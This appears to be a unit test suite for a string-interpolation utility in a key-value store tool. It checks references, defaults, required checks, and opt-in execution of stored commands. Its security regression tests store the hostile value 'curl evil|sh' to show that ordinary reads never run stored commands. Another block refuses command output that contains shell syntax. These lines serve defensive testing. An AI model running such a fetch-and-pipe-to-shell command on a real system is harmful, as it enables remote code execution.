import type { Mock } from 'bun:test';
import { execSync } from 'child_process';
import { interpolate, interpolateExec, interpolateForRead, interpolateObject, collectReferencedKeys, StrictInterpolationError, unresolvedWarning, unresolvedOverflowNote } from '../utils/interpolate';
import type { UnresolvedOnRead } from '../utils/interpolate';
import { StoreUnreadableError } from '../utils/unreadable';
import { getValue } from '../storage';
import { resolveKey } from '../alias';
import { referenceOver } from './helpers/resolverMocks';

// Mock storage and alias modules
vi.mock('../storage', () => {
  const getValue = vi.fn();
  return {
    getValue,
    // #280: interpolation reads through getValueWithStore. A plain function
    // over the getValue mock, so each test sets its values one way; a value
    // read in the default scope counts as the project's.
    getValueWithStore: (key: string, scope?: string) => {
      const value: unknown = scope === undefined ? getValue(key) : getValue(key, scope);
      return value === undefined ? undefined : { value, store: scope === 'global' ? 'global' : 'project' };
    },
    loadData: vi.fn(() => ({})),
    entryStoreOf: vi.fn(() => { throw new Error('entryStoreOf is not mocked in this suite'); }),
  };
});

vi.mock('../alias', () => {
  const resolveKey = vi.fn((key: string) => key);
  return {
    resolveKey,
    loadAliases: vi.fn(() => ({})),
    // The resolver's wrappers, over the resolveKey mock (helpers/resolverMocks).
    resolveReferenceName: (name: string, from: 'project' | 'global') => referenceOver(resolveKey, name, from),
  };
});

vi.mock('child_process', () => ({
  execSync: vi.fn(),
}));

const mockGetValue = getValue as Mock<typeof getValue>;
const mockResolveKey = resolveKey as Mock<typeof resolveKey>;
const mockExecSync = execSync as Mock<typeof execSync>;

beforeEach(() => {
  vi.clearAllMocks();
  mockResolveKey.mockImplementation((key: string) => key);
});

describe('interpolate', () => {
  it('returns plain strings unchanged', () => {
    expect(interpolate('hello world')).toBe('hello world');
  });

  it('resolves a single ${key} reference', () => {
    mockGetValue.mockReturnValueOnce('/home/user');
    expect(interpolate('cd ${paths.home}')).toBe('cd /home/user');
    expect(mockGetValue).toHaveBeenCalledWith('paths.home');
  });

  it('resolves multiple references in one string', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return 'hello';
      if (key === 'b') return 'world';
      return undefined;
    });
    expect(interpolate('${a} and ${b}')).toBe('hello and world');
  });

  it('resolves aliases via resolveKey', () => {
    mockResolveKey.mockImplementation((key: string) => {
      if (key === 'myalias') return 'actual.key';
      return key;
    });
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'actual.key') return 'resolved value';
      return undefined;
    });
    expect(interpolate('${myalias}')).toBe('resolved value');
    expect(mockResolveKey).toHaveBeenCalledWith('myalias');
  });

  it('resolves nested references recursively', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return '${b}/suffix';
      if (key === 'b') return 'base';
      return undefined;
    });
    expect(interpolate('${a}')).toBe('base/suffix');
  });

  it('throws on circular references', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return '${b}';
      if (key === 'b') return '${a}';
      return undefined;
    });
    expect(() => interpolate('${a}')).toThrow(/Circular interpolation/);
  });

  it('throws when referenced key is not found', () => {
    mockGetValue.mockReturnValueOnce(undefined);
    expect(() => interpolate('${nonexistent}')).toThrow('Interpolation failed: "nonexistent" not found');
  });

  it('throws when referenced key is not a string (subtree)', () => {
    mockGetValue.mockReturnValueOnce({ nested: 'object' });
    expect(() => interpolate('${subtree}')).toThrow('Interpolation failed: "subtree" is not a string value');
  });

  it('throws when referenced key is encrypted', () => {
    mockGetValue.mockReturnValueOnce('encrypted::v1:abc');
    expect(() => interpolate('${secret}')).toThrow('Interpolation failed: "secret" is encrypted');
  });

  it('leaves $notref and ${unclosed alone', () => {
    expect(interpolate('$notref')).toBe('$notref');
    expect(interpolate('${unclosed')).toBe('${unclosed');
  });

  it('leaves ${} (empty ref) unchanged', () => {
    expect(interpolate('${}')).toBe('${}');
    expect(interpolate('text ${} more')).toBe('text ${} more');
  });

  it('trims whitespace in key references', () => {
    mockGetValue.mockReturnValueOnce('value');
    expect(interpolate('${ key }')).toBe('value');
    expect(mockResolveKey).toHaveBeenCalledWith('key');
  });

  it('throws when depth limit is exceeded', () => {
    // Create a chain that exceeds maxDepth
    mockGetValue.mockImplementation(() => '${next}');
    expect(() => interpolate('${start}', 1)).toThrow(/depth limit exceeded/);
  });
});

describe('conditional interpolation ${key:-default} and ${key:?error}', () => {
  describe(':- (default value)', () => {
    it('uses default when key is not found', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('${missing:-fallback}')).toBe('fallback');
    });

    it('uses existing value when key exists (ignores default)', () => {
      mockGetValue.mockReturnValueOnce('real');
      expect(interpolate('${exists:-fallback}')).toBe('real');
    });

    it('supports empty default value', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('${missing:-}')).toBe('');
    });

    it('interpolates ${} references within the default value', () => {
      mockGetValue.mockImplementation((key: string) => {
        if (key === 'missing') return undefined;
        if (key === 'other') return 'resolved';
        return undefined;
      });
      expect(interpolate('${missing:-${other}}')).toBe('resolved');
    });

    it('uses literal default containing colons', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('${missing:-http://example.com}')).toBe('http://example.com');
    });

    it('works in a string with surrounding text', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('hello ${name:-world}!')).toBe('hello world!');
    });

    it('works alongside normal interpolation', () => {
      mockGetValue.mockImplementation((key: string) => {
        if (key === 'greeting') return 'hi';
        if (key === 'name') return undefined;
        return undefined;
      });
      expect(interpolate('${greeting} ${name:-stranger}')).toBe('hi stranger');
    });
  });

  describe(':? (required with custom error)', () => {
    it('throws custom error when key is not found', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(() => interpolate('${missing:?API key is required}')).toThrow('API key is required');
    });

    it('uses existing value when key exists (no error)', () => {
      mockGetValue.mockReturnValueOnce('real');
      expect(interpolate('${exists:?should not throw}')).toBe('real');
    });

    it('throws generic message when :? has no message', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(() => interpolate('${missing:?}')).toThrow('"missing" is required but not set');
    });

    it('supports error message containing colons', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(() => interpolate('${missing:?error: key not set}')).toThrow('error: key not set');
    });

    it('returns existing value when key exists, even if :? message contains ${:-}', () => {
      mockGetValue.mockReturnValueOnce('real');
      expect(interpolate('${exists:?msg ${x:-y}}')).toBe('real');
    });

    it('throws with literal modValue when :? message contains nested ${:-}', () => {
      mockGetValue.mockReturnValue(undefined);
      expect(() => interpolate('${missing:?msg ${x:-y}}')).toThrow('msg ${x:-y}');
    });
  });

  describe('parseRef ambiguity — modifier value contains the other modifier token', () => {
    it(':- default containing :? is treated as plain default text', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('${missing:-text:?not-an-error}')).toBe('text:?not-an-error');
    });

    it(':? message containing :- is treated as plain error text', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(() => interpolate('${missing:?error :-oops}')).toThrow('error :-oops');
    });
  });
});

describe('interpolateObject', () => {
  it('interpolates leaf string values in a flat object', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'base') return '/home';
      return undefined;
    });
    const result = interpolateObject({ path: '${base}/docs' });
    expect(result['path']).toBe('/home/docs');
  });

  it('keeps encrypted values as-is', () => {
    const result = interpolateObject({ secret: 'encrypted::v1:abc' });
    expect(result['secret']).toBe('encrypted::v1:abc');
  });

  it('keeps raw value if interpolation fails on a leaf', () => {
    mockGetValue.mockReturnValue(undefined);
    const result = interpolateObject({ path: '${missing}/file' });
    expect(result['path']).toBe('${missing}/file');
  });

  // Regression for the v1.11 flogging finding: interpolateObject was
  // catching ALL errors and silently returning the raw template, including
  // `:?` required-check failures and circular-reference detections. The
  // user explicitly opted into fail-loud behavior with `:?`, and a cycle
  // is a structural bug that must surface — both should propagate.
  describe('strict error propagation', () => {
    it('re-throws StrictInterpolationError from `:?` required-check', () => {
      mockGetValue.mockReturnValue(undefined);
      expect(() =>
        interpolateObject({ path: '${missing:?must be set}' })
      ).toThrow(StrictInterpolationError);
      expect(() =>
        interpolateObject({ path: '${missing:?must be set}' })
      ).toThrow(/must be set/);
    });

    it('re-throws StrictInterpolationError from circular references', () => {
      mockGetValue.mockImplementation((key: string) => {
        if (key === 'a') return '${b}';
        if (key === 'b') return '${a}';
        return undefined;
      });
      expect(() =>
        interpolateObject({ path: '${a}' })
      ).toThrow(StrictInterpolationError);
    });

    it('still swallows plain "not found" errors as raw fallback', () => {
      // Plain misses (no `:?`) keep the friendly subtree-fallback behavior:
      // one broken leaf shouldn't fail the whole subtree get.
      mockGetValue.mockReturnValue(undefined);
      const result = interpolateObject({
        good: 'plain',
        bad: '${missing}/x',
      });
      expect(result['good']).toBe('plain');
      expect(result['bad']).toBe('${missing}/x');
    });
  });
});

// SECURITY: $(key) exec resolution is OPT-IN via interpolateExec(). The plain
// interpolate() (safe default) must NEVER execute — see the dedicated
// "safe interpolate() never executes $(key)" block below. These tests exercise
// the exec engine through its only entry point, interpolateExec().
// #202: a read returns the stored text when a reference does not resolve. Only
// that falls back, and the scan goes on past it. Two earlier versions of this
// got it wrong: one caught every error and called it a chain nested too
// deeply; one stopped at the first unresolved reference, so a `:?` after it
// no longer failed the read.
describe('what a read falls back on (#202)', () => {
  const conflicted = () => new StoreUnreadableError(
    [{ kind: 'entry', path: '/repo/.reverie/paths.home.json', key: 'paths.home', reason: 'conflict' }], 'read');
  const stored = (entries: Record<string, string>) => {
    mockGetValue.mockImplementation((key: string) => entries[key]);
  };

  it('a reference with no such key: the stored text, and the reference named', () => {
    stored({});
    expect(interpolateForRead('cd ${paths.home}')).toEqual({
      value: 'cd ${paths.home}',
      unresolved: { ref: 'paths.home', why: 'is not a stored key' },
    });
  });

  it('names the reference exactly as written, spaces and modifier included', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'group' ? { child: 'x' } : undefined));
    expect(interpolateForRead('a ${ SPACED } b').unresolved?.ref).toBe(' SPACED ');
    expect(interpolateForRead('a ${group:-fallback} b').unresolved).toEqual({ ref: 'group:-fallback', why: 'is a group of entries, not a value' });
  });

  it('a reference inside a `:-` default is one written in this entry', () => {
    stored({});
    expect(interpolateForRead('${a:-${b}}').unresolved).toEqual({ ref: 'b', why: 'is not a stored key' });
  });

  it('a failure in another entry names the reference that leads there', () => {
    stored({ 'arch.inner': 'inner uses ${MISSING2}' });
    expect(interpolateForRead('see ${arch.inner} here')).toEqual({
      value: 'see ${arch.inner} here',
      unresolved: { via: 'arch.inner', ref: 'MISSING2', why: 'is not a stored key' },
    });
  });

  it('a chain past the depth limit: the stored text, and no entry down the chain blamed', () => {
    // Every key resolves to a reference to a new key: never a cycle, never an end.
    mockGetValue.mockImplementation((key: string) => `\${${key}x}`);
    expect(interpolateForRead('${a}')).toEqual({
      value: '${a}',
      unresolved: { via: 'a', why: 'nests references too deeply to resolve' },
    });
  });

  it('a reference to an entry whose file cannot be read: the stored text, and that entry named', () => {
    mockGetValue.mockImplementation(() => { throw conflicted(); });
    expect(interpolateForRead('cd ${paths.home}')).toEqual({
      value: 'cd ${paths.home}',
      unresolved: { why: "refers to entry 'paths.home', whose store file cannot be read" },
    });
  });

  it('interpolateObject hands each of those to its callback and keeps the other leaves', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'ok') return 'fine';
      if (key === 'broken') throw conflicted();
      return undefined;
    });
    const seen: [string, UnresolvedOnRead][] = [];
    const result = interpolateObject(
      { a: '${ok}', b: '${nope}', c: '${broken}' },
      (key, unresolved) => { seen.push([key, unresolved]); },
    );
    expect(result).toEqual({ a: 'fine', b: '${nope}', c: '${broken}' });
    expect(seen).toEqual([
      ['b', { ref: 'nope', why: 'is not a stored key' }],
      ['c', { why: "refers to entry 'paths.home', whose store file cannot be read" }],
    ]);
  });

  it('an error it does not recognize propagates: a fault is not an unresolved reference', () => {
    mockGetValue.mockImplementation(() => { throw new TypeError('store exploded'); });
    expect(() => interpolateForRead('${a}')).toThrow('store exploded');
    expect(() => interpolateObject({ k: '${a}' })).toThrow('store exploded');
  });

  it('`:?` and a cycle still fail the read', () => {
    stored({});
    expect(() => interpolateForRead('${a:?must be set}')).toThrow(StrictInterpolationError);
    stored({ a: '${b}', b: '${a}' });
    expect(() => interpolateForRead('${a}')).toThrow(/Circular/);
  });

  it('…also when an unresolved reference comes first, here or in an entry it reaches', () => {
    stored({});
    expect(() => interpolateForRead('first ${MISSING} then ${nope:?must be set}')).toThrow('must be set');
    expect(() => interpolateObject({ k: 'first ${MISSING} then ${nope:?must be set}' })).toThrow('must be set');
    stored({ a: '${b}', b: '${a}' });
    expect(() => interpolateForRead('first ${MISSING} then ${a}')).toThrow(/Circular/);
    stored({ inner: '${MISSING} then ${nope:?inner guard}' });
    expect(() => interpolateForRead('see ${inner}')).toThrow('inner guard');
  });

  it('never executes a $(key), alone or after a reference that does not resolve', () => {
    stored({ cmd: 'touch /tmp/should-not-exist' });
    expect(interpolateForRead('before $(cmd) after')).toEqual({ value: 'before $(cmd) after' });
    expect(interpolateForRead('${MISSING} then $(cmd)').value).toBe('${MISSING} then $(cmd)');
    expect(interpolateForRead('${nope:-$(cmd)}').value).toBe('$(cmd)');
    expect(interpolateObject({ k: '$(cmd)', j: '${MISSING} $(cmd)' })).toEqual({ k: '$(cmd)', j: '${MISSING} $(cmd)' });
    expect(mockExecSync).not.toHaveBeenCalled();
  });
});

describe('unresolvedWarning', () => {
  it('a reference written in the entry: named, with the escape', () => {
    expect(unresolvedWarning('conventions.rfvar', { ref: 'EMPTY', why: 'is not a stored key' }))
      .toBe("'conventions.rfvar' refers to ${EMPTY}, which is not a stored key. Its value is returned as written. "
        + 'If that is literal text, store it escaped: \\${EMPTY}.');
  });

  it('a failure in another entry: the way there, and no escape advice — escaping here would fix nothing', () => {
    expect(unresolvedWarning('arch.outer', { via: 'arch.inner', ref: 'MISSING2', why: 'is not a stored key' }))
      .toBe("'arch.outer' refers to ${arch.inner}, which leads to ${MISSING2}, and that is not a stored key. Its value is returned as written.");
    expect(unresolvedWarning('k', { via: 'a', why: 'nests references too deeply to resolve' }))
      .toBe("'k' refers to ${a}, which nests references too deeply to resolve. Its value is returned as written.");
  });

  it('no one reference at fault', () => {
    expect(unresolvedWarning('k', { why: "refers to entry 'x.y', whose store file cannot be read" }))
      .toBe("'k' refers to entry 'x.y', whose store file cannot be read. Its value is returned as written.");
  });

  it('whatever the cause, its own words never say "not found": the MCP hit detector reads that as a miss', () => {
    // Driven through interpolateForRead, so a reworded clause is caught here.
    const causes: [string, () => void][] = [
      ['missing', () => { mockGetValue.mockImplementation(() => undefined); }],
      ['a group', () => { mockGetValue.mockImplementation(() => ({ child: 'x' })); }],
      ['encrypted', () => { mockGetValue.mockImplementation(() => 'encrypted::v1:abc'); }],
      ['too deep', () => { mockGetValue.mockImplementation((key: string) => `\${${key}x}`); }],
      ['unreadable', () => { mockGetValue.mockImplementation(() => { throw new StoreUnreadableError([{ kind: 'entry', path: '/r/.reverie/a.json', key: 'a', reason: 'parse' }], 'read'); }); }],
    ];
    for (const [name, arrange] of causes) {
      arrange();
      const read = interpolateForRead('${a}');
      expect(read.unresolved, name).toBeDefined();
      expect(unresolvedWarning('k', read.unresolved!).toLowerCase(), name).not.toContain('not found');
    }
  });

  it('the overflow note agrees in number', () => {
    expect(unresolvedOverflowNote(1)).toBe('1 more entry holds a reference that does not resolve');
    expect(unresolvedOverflowNote(2)).toBe('2 more entries hold a reference that does not resolve');
  });
});

describe('exec interpolation $(key) — via interpolateExec', () => {
  it('executes stored command and returns stdout', () => {
    mockGetValue.mockReturnValueOnce('echo hello');
    mockExecSync.mockReturnValueOnce('hello\n');

    expect(interpolateExec('$(cmd)')).toBe('hello');
    expect(mockExecSync).toHaveBeenCalledWith('echo hello', expect.objectContaining({
      encoding: 'utf-8',
      timeout: 10000,
    }));
  });

  it('caches exec results — same key only executed once', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'cmd') return 'whoami';
      return undefined;
    });
    mockExecSync.mockReturnValue('kh\n');

    expect(interpolateExec('$(cmd) and $(cmd)')).toBe('kh and kh');
    expect(mockExecSync).toHaveBeenCalledTimes(1);
  });

  it('interpolates ${} inside stored command before executing', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'cmd') return 'echo ${name}';
      if (key === 'name') return 'world';
      return undefined;
    });
    mockExecSync.mockReturnValueOnce('world\n');

    expect(interpolateExec('$(cmd)')).toBe('world');
    expect(mockExecSync).toHaveBeenCalledWith('echo world', expect.anything());
  });

  it('handles mixed ${a} and $(b) in same string', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'user') return 'kh';
      if (key === 'cmd') return 'echo hi';
      return undefined;
    });
    mockExecSync.mockReturnValueOnce('hi\n');

    expect(interpolateExec('/Users/${user}/$(cmd)')).toBe('/Users/kh/hi');
  });

  it('throws when exec key is not found', () => {
    mockGetValue.mockReturnValueOnce(undefined);
    expect(() => interpolateExec('$(missing)')).toThrow('Exec interpolation failed: "missing" not found');
  });

  it('throws when exec key is a subtree (not a string)', () => {
    mockGetValue.mockReturnValueOnce({ nested: 'object' });
    expect(() => interpolateExec('$(subtree)')).toThrow('Exec interpolation failed: "subtree" is not a string value');
  });

  it('throws when exec key is encrypted', () => {
    mockGetValue.mockReturnValueOnce('encrypted::v1:abc');
    expect(() => interpolateExec('$(secret)')).toThrow('Exec interpolation failed: "secret" is encrypted');
  });

  it('throws on non-zero exit code', () => {
    mockGetValue.mockReturnValueOnce('exit 42');
    const err: any = new Error('Command failed');
    err.status = 42;
    mockExecSync.mockImplementationOnce(() => { throw err; });

    expect(() => interpolateExec('$(fail)')).toThrow('Exec interpolation failed: "fail" exited with code 42');
  });

  it('detects circular exec references', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return '$(a)';
      return undefined;
    });
    expect(() => interpolateExec('$(a)')).toThrow(/Circular interpolation/);
  });

  it('detects circular cross-type references (${} → $())', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return '$(b)';
      if (key === 'b') return '${a}';
      return undefined;
    });
    expect(() => interpolateExec('${a}')).toThrow(/Circular interpolation/);
  });

  it('leaves $(unclosed alone (no closing paren)', () => {
    expect(interpolateExec('$(unclosed')).toBe('$(unclosed');
  });

  it('trims whitespace in exec key reference', () => {
    mockGetValue.mockReturnValueOnce('echo ok');
    mockExecSync.mockReturnValueOnce('ok\n');

    expect(interpolateExec('$( cmd )')).toBe('ok');
    expect(mockResolveKey).toHaveBeenCalledWith('cmd');
  });

  it('respects depth limit for exec interpolation', () => {
    mockGetValue.mockImplementation(() => '$(next)');
    // positional allowExec=true with a shallow maxDepth
    expect(() => interpolate('$(start)', 1, new Set(), new Map(), true)).toThrow(/depth limit exceeded/);
  });

  it('returns plain strings without $( unchanged', () => {
    expect(interpolateExec('no exec here')).toBe('no exec here');
    expect(mockExecSync).not.toHaveBeenCalled();
  });
});

// SECURITY REGRESSION (read = RCE, fixed): the safe default must never run a
// stored command. A hostile .reverie/ store shipped in a cloned repo could
// otherwise achieve code execution the moment an agent merely READ an entry.
describe('safe interpolate() never executes $(key)', () => {
  it('leaves $(key) literal and does NOT execSync (single value)', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'pwn' ? 'curl evil|sh' : undefined));
    mockExecSync.mockReturnValue('PWNED\n');

    expect(interpolate('status: $(pwn)')).toBe('status: $(pwn)');
    expect(mockExecSync).not.toHaveBeenCalled();
  });

  it('still resolves ${value} refs while leaving $(exec) refs literal', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'name') return 'world';
      if (key === 'pwn') return 'curl evil|sh';
      return undefined;
    });
    expect(interpolate('${name} $(pwn)')).toBe('world $(pwn)');
    expect(mockExecSync).not.toHaveBeenCalled();
  });

  it('interpolateObject (read path for get --values) never executes $(key)', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'cmd' ? 'whoami' : undefined));
    mockExecSync.mockReturnValue('kh\n');

    const result = interpolateObject({ a: '$(cmd)', b: '$(cmd)' });

    expect(result['a']).toBe('$(cmd)');
    expect(result['b']).toBe('$(cmd)');
    expect(mockExecSync).not.toHaveBeenCalled();
  });

  it('does not execute $(key) reached indirectly through a ${value} ref', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'wrapper') return '$(pwn)';
      if (key === 'pwn') return 'curl evil|sh';
      return undefined;
    });
    // ${wrapper} resolves to the literal text "$(pwn)" but must not then exec it
    expect(interpolate('${wrapper}')).toBe('$(pwn)');
    expect(mockExecSync).not.toHaveBeenCalled();
  });
});

// #242: what a command prints is data. Pasted into a command the shell then
// evaluates, output holding shell syntax ran as code; scanned again by the
// outer pass, it ran as an exec reference; and it could supply the key of a
// `$(…)` the gate's collect pass never saw.
describe('exec output is data, not code (#242)', () => {
  it.each(['`', '$', ';', '&', '|', '<', '>', '(', ')', "'", '"', '\\', '#', '\n'])(
    'refuses output holding %p',
    (ch) => {
      mockGetValue.mockImplementation((key: string) => (key === 'cmd' ? 'printf x' : undefined));
      mockExecSync.mockReturnValue(`a${ch}b\n`);
      expect(() => interpolateExec('echo $(cmd)')).toThrow(/Exec interpolation refused: "cmd" printed shell syntax/);
    },
  );

  it('names a newline in words', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'cmd' ? 'printf x' : undefined));
    mockExecSync.mockReturnValue('one\ntwo\n');
    expect(() => interpolateExec('$(cmd)')).toThrow('(a newline)');
  });

  it('drops every trailing newline, as the shell does', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'cmd' ? 'git describe' : undefined));
    mockExecSync.mockReturnValue('v1.4.0\n\n\n');
    expect(interpolateExec('echo $(cmd)')).toBe('echo v1.4.0');
  });

  it('passes plain output — words, paths, versions — unchanged', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'cmd' ? 'printf x' : undefined));
    mockExecSync.mockReturnValue('a b-c /d/e.f:g=h@i%j+k,l ~m*n?[o]{p}\n');
    expect(interpolateExec('echo $(cmd)')).toBe('echo a b-c /d/e.f:g=h@i%j+k,l ~m*n?[o]{p}');
  });

  it('does not scan a referenced value again: its escaped \\$(key) stays literal', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'note') return 'echo \\$(plain) here';
      if (key === 'plain') return 'touch /tmp/should-not-run';
      return undefined;
    });
    expect(interpolateExec('${note}')).toBe('echo $(plain) here');
    expect(mockExecSync).not.toHaveBeenCalled();
    expect(collectReferencedKeys('${note}')).toEqual(new Set(['note']));
  });

  it('refuses a $(…) whose key a ${…} supplies, and runs nothing for it', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'which' ? 'deploy' : key === 'deploy' ? 'touch x' : undefined));
    expect(() => interpolateExec('$(${which})')).toThrow(/takes its key from a \$\{…\} reference/);
    expect(mockExecSync).not.toHaveBeenCalled();
  });

  it('refuses it also when the ${…} is empty or only part of the key', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'empty' ? '' : key === 'part' ? 'ploy' : undefined));
    expect(() => interpolateExec('$(de${part})')).toThrow(/takes its key from/);
    expect(() => interpolateExec('$(deploy${empty})')).toThrow(/takes its key from/);
    expect(mockExecSync).not.toHaveBeenCalled();
  });

  it('a read leaves $(${…}) as text and does not throw', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'which' ? 'deploy' : undefined));
    expect(interpolate('$(${which})')).toBe('$(deploy)');
  });

  it('a ${…} next to a $(…), not inside it, is fine', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'dir' ? '/srv' : key === 'cmd' ? 'printf ok' : undefined));
    mockExecSync.mockReturnValue('ok\n');
    expect(interpolateExec('${dir}/$(cmd)/${dir}')).toBe('/srv/ok//srv');
  });
});
